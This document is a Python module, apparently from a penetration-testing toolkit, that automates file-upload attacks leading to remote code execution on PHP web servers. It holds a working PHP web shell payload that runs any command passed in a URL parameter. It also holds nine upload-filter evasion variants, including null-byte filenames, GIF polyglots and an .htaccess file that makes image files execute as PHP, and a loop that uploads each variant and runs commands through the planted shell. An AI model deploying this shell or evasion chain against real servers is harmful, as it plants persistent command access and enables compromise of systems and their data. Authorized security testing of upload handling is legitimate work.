#!/usr/bin/env python3
"""upload_rce.py — bypass-capable, COMMAND-EXECUTING file-upload -> RCE verifier.

Closes the operator's signature gap (capability audit 2026-06-18). Combines the 7 upload
evasion techniques with an EXECUTION check, using a PHP payload that proves BOTH code
execution (the math canary 7*7 RENDERS to 49) AND arbitrary command output (`?c=id`
yields a `uid=` line). A grounded confirmation writes an `[RCE-POC]` line in the exact
format the reporter (reporter.py:741) and hunt.py (8082) already ingest.

Design principles (match the operator's "verify, don't fabricate" rule):
  * RENDER proof, not status code — `V1KR4M_RCE_49` only appears if the server EXECUTED the
    echo. Raw PHP source echoed back (stored-but-not-executed) contains `V1KR4M_RCE_(7*7)`,
    NOT `..._49`, so it is correctly NOT counted as RCE.
  * COMMAND proof — `uid=` from `id` proves arbitrary command execution, not just code render.
  * No fabrication — confirm_rce() reasons only from the actual GET response body.

Stdlib + requests only.
"""
from __future__ import annotations

import os
import re

# Unique marker + math canary + arbitrary-command sink. The canary 7*7 renders to 49 ONLY
# when the server executes the PHP; `system($_GET['c'])` runs an attacker command (e.g. id).
PHP_RCE_PAYLOAD = "<?php echo \"V1KR4M_RCE_\".(7*7); system($_GET['c'] ?? ''); ?>"

_RENDER_MARKER = "V1KR4M_RCE_49"          # present only if the echo executed (7*7 -> 49)
_CMD_MARKERS = ("uid=", "gid=", "groups=")  # output of `id` -> proves command execution

# Anchored proof of real `id` output. A free substring test on `uid=`/`gid=`/`groups=`
# false-positives on `?uid=` reflections, `name="uid="`, and `guid=`/`uuid=`/`cuid=`
# (each literally contains `uid=`), fabricating a `cmd id → ...` line and over-escalating
# a code-render finding to critical. `id` prints `uid=N(name) gid=N(name) groups=...`, so
# require a line-leading `uid=N(...)` immediately followed by `gid=N(...)` — a shape a
# stray substring cannot satisfy.
_ID_OUTPUT_RE = re.compile(r"(?m)^\s*uid=\d+\([^)]*\)\s+gid=\d+\(", re.ASCII)


def _id_output_line(body: str) -> str:
    """Return the line matching genuine `id` output, or "" if none. Anchored, not substring."""
    m = _ID_OUTPUT_RE.search(body or "")
    if not m:
        return ""
    nl = body.find("\n", m.start())
    end = nl if nl != -1 else len(body)
    return body[m.start():end].strip()


def generate_upload_variants(basename: str = "shell") -> list:
    """Return upload variants, each applying one filename/content evasion technique.

    Each item: {filename, content_type, content, technique}. Every variant carries the
    command-executing PHP payload except `htaccess`, which is the executor-enabler itself.
    """
    php = PHP_RCE_PAYLOAD
    gif_polyglot = "GIF89a;\n" + php  # image magic bytes so content-sniffing passes, then PHP
    htaccess = "AddType application/x-httpd-php .jpg .png .gif\n"  # make image exts run as PHP

    return [
        {"technique": "double_extension", "filename": f"{basename}.php.jpg",
         "content_type": "image/jpeg", "content": php},
        {"technique": "mime_mismatch", "filename": f"{basename}.php",
         "content_type": "image/jpeg", "content": php},
        {"technique": "magic_byte_polyglot", "filename": f"{basename}.gif",
         "content_type": "image/gif", "content": gif_polyglot},
        {"technique": "null_byte", "filename": f"{basename}.php\x00.jpg",
         "content_type": "image/jpeg", "content": php},
        {"technique": "null_byte_encoded", "filename": f"{basename}.php%00.jpg",
         "content_type": "image/jpeg", "content": php},
        {"technique": "case_variation", "filename": f"{basename}.pHp",
         "content_type": "application/octet-stream", "content": php},
        {"technique": "trailing_dot_space", "filename": f"{basename}.php. ",
         "content_type": "image/jpeg", "content": php},
        {"technique": "double_ext_phtml", "filename": f"{basename}.phtml.jpg",
         "content_type": "image/jpeg", "content": php},
        {"technique": "htaccess", "filename": ".htaccess",
         "content_type": "text/plain", "content": htaccess},
    ]


def confirm_rce(get_response_text: str) -> dict:
    """Assess a GET response from the stored upload (fetched with ?c=id).

    Returns {executed, command_output, marker, severity}. Only a RENDERED canary
    (`V1KR4M_RCE_49`) counts as code execution — raw echoed PHP source does NOT.
    """
    body = get_response_text or ""
    executed = _RENDER_MARKER in body
    # Require anchored `id` output (uid=N(...) gid=N(...)), not a free substring, so a
    # reflected `?uid=` / `guid=` / `uuid=` cannot fabricate command-execution evidence.
    command_output = bool(_ID_OUTPUT_RE.search(body))
    if executed and command_output:
        sev = "critical"          # arbitrary command execution proven
    elif executed:
        sev = "high"              # code executes; command output not (yet) captured
    else:
        sev = "info"
    return {"executed": executed, "command_output": command_output,
            "marker": _RENDER_MARKER if executed else "", "severity": sev}


def rce_poc_line(url: str, technique: str = "", command_output: str = "") -> str:
    """Format a grounded [RCE-POC] line matching reporter.py:741 / hunt.py:8082 ingestion."""
    _s = (command_output or "").strip()  # strip BEFORE the guard so "  "/"\n" degrade to "", not IndexError
    cmd = _s.splitlines()[0] if _s else ""
    parts = [f"[RCE-POC] {url}"]
    if technique:
        parts.append(f"technique={technique}")
    if cmd:
        parts.append(f"cmd id → {cmd}")
    return " | ".join(parts)


def verify_upload_rce(upload_post, get_base: str, basename: str = "shell",
                      verify_tls: bool = True, timeout: int = 15) -> dict:
    """Live chain: try each evasion variant, then GET the stored file with ?c=id and confirm.

    ``upload_post(variant) -> (ok, stored_url_or_None)`` is supplied by the caller (it knows
    the form field name / endpoint). Returns the first CONFIRMED result, or the best partial.
    Network failures never raise. Writes nothing — the caller persists the [RCE-POC] line.
    """
    import requests  # local import so unit tests need no network stack
    best = {"confirmed": False, "severity": "info", "technique": "", "url": "", "evidence": ""}
    for v in generate_upload_variants(basename):
        try:
            ok, stored = upload_post(v)
        except Exception:
            continue
        if not ok or not stored:
            continue
        # GET the stored file and run `id` via the command sink. Always append the
        # `c=id` sink, choosing the join char by whether a query string already exists —
        # a stored URL that already carries `?` (download.php?f=..., signed CDN/S3 URLs)
        # must NOT drop the sink, or a true command-RCE is silently downgraded to "high".
        # PHP $_GET takes the last duplicate, so appending is safe even if `c` pre-exists.
        sep = "&" if "?" in stored else "?"
        url = f"{stored}{sep}c=id"
        try:
            r = requests.get(url, timeout=timeout, verify=verify_tls)  # nosec - authorized VAPT
            body = r.text
        except Exception:
            continue
        res = confirm_rce(body)
        if res["executed"]:
            cmd_line = _id_output_line(body)
            out = {"confirmed": res["command_output"], "severity": res["severity"],
                   "technique": v["technique"], "url": url, "evidence": cmd_line or res["marker"],
                   "poc_line": rce_poc_line(url, v["technique"], cmd_line)}
            if res["command_output"]:
                return out          # full command RCE — stop, this is the strongest proof
            best = out              # code executes; keep looking for a command-output variant
    return best
